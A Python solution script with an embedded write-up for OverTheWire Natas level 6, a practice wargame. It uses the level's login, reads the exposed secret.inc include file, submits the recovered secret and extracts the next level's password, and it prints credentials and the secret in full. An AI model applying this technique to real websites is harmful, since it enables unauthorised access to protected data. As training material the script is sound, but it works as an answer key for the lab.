#!/usr/bin/env python3
'''
https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas6.py

https://www.youtube.com/watch?v=pUJdNIezyYY&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=4
https://docs.python-requests.org/en/master/
https://docs.python-requests.org/en/master/user/quickstart/#cookies

Level 6 → Level 7
Username: natas6
URL:      http://natas6.natas.labs.overthewire.org
password: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
problem:Input secret: View sourcecode

write up:
  1.  in the source code we find a line: include "includes/secret.inc";

     <?
      include "includes/secret.inc";

     if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
     } else {
        print "Wrong secret";
      }
    }
     ?>
   Usally we can not see  a PHP code in the sorce code

  2.  Open   http://natas6.natas.labs.overthewire.org/includes/secret.inc
        output: <?
        $secret = "FOEIUWGHFEEUHOFUOIU";
           ?>
  3. in input box of first page put "FOEIUWGHFEEUHOFUOIU"
     Output:
	     Access granted. The password for natas7 is


'''
import requests
import re

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

source ='index-source.html'
url0 = 'http://%s.natas.labs.overthewire.org/' % username
url1 = url0 + source
print('\nURL0 = ',url0,'\n')

session = requests.Session()
response = session.post(url0, auth = (username, password) )
content = response.text
print("1. response.text \n\n",response.text)

url2 = url0 +  'includes/secret.inc'
print('\n2.URL0 = ',url2,'\n')
response = session.post(url2,  auth = (username, password) )

content = response.text #content of file  'includes/secret.inc'
print('\n3.secret.inc content = ',content,'\n')
secret =re.findall('secret = "(.*)";', content)[0]


print ('4.secret=',secret)
d = {"secret": secret, "submit":"submit"}
print ("5.data =",d)
response = session.post(url0, data = d, auth = (username, password) )

print ('6.response=',response.text)

paswrd = re.findall(' natas7 is (.*)', response.text)[0]

print ("7. Password for natas7 is: ",paswrd)